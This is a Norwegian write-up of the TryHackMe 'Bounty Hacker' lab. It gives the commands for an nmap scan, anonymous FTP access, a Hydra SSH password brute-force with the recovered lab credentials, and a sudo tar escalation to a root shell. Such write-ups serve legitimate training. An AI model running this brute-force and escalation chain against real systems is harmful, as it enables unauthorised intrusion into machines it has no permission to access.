## Bounty Hacker - Try Hack Me

## 1. Overview
En maskin som var rata *easy* på tryhackme.com
Omhandlet å ta seg inn på en anonym **FTP** server for å hente ut noen filer. Videre ble det brukt **Hydra** for å bruteforce oss inn på **ssh**. Til slutt fant man ut at brukeren hadde rettigheter til å **kjøre en kommando som root**, og man kunne spawne et root shell.

Link til maskinen: https://tryhackme.com/room/cowboyhacker  



## 2. Oppgaver
### 2.1 User.txt

```sh
export IP=10.10.13.45
```

Kjører først en **NMAP** scan:
```sh
nmap -sV -sC -oA nmap/ $IP
```
NMAP skannen viste til 3 åpne porter på maskinen:

- ***21 ftp***
- ***22 ssh***
- ***80 http***

FTP serveren er første hintet.
Serveren har anonym pålogging, så jeg kom inn ved å skrive:
```sh
ftp $IP
```

Når den spør om username så brukte jeg "anonymous", passord feltet lot jeg være blankt.
Lasta ned en `task.txt` og en `locks.txt` som lå på fil serveren.
I task.txt finner man ut at en av brukerene heter "Lin". Locks.txt inneholder bare masse passord.

Så et av hintene er at man skal bruteforce ssh porten med de passordene funnet.
Til dette brukte jeg Hydra:
```sh
hydra -l lin -P locks.txt $IP -t 4 ssh
```

-l er user, og -P brukes for å spesifisere en wordlist man skal bruke til bruteforcen.
Hydra fant en successfull login --> `lin:RedDr4gonSynd1cat3`

Logger da inn på ssh med
```sh
ssh lin@$IP
```

Brukte denne guiden for hydra:
https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux  
På desktopen lå det en user.txt fil som inneholdt flagget.



### 2.2 root.txt
Brukte ssh til å kopiere over et privesc script. Bruker Linpeas i dette tilfelle:
```sh
scp ./linpeas.sh lin@$IP:/home/Documents/
```

Linpeas skriptet har jeg klonet fra githuben deres: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

Den ga mye nyttig, men det viktigste var at man måtte sjekke kommandoen "sudo -l"
sudo -l ga meg noe å jobbe med:
```sh
User lin may run the following commands on bountyhacker:                                                                                                     
    (root) /bin/tar
```

Så kjørte jeg et søk på GTFObin om `tar` kommandoen. Det fantes flere muligheter, og dette var kommandoen jeg endte opp med å kjøre for å spawne et root shell:
```sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Kan se om man er root ved å skrive `id`, eller `whoami`.
Deretter bruker jeg shellet til å finne `root.txt` fila:
```sh
find / -name "root.txt" 2>/dev/null
```

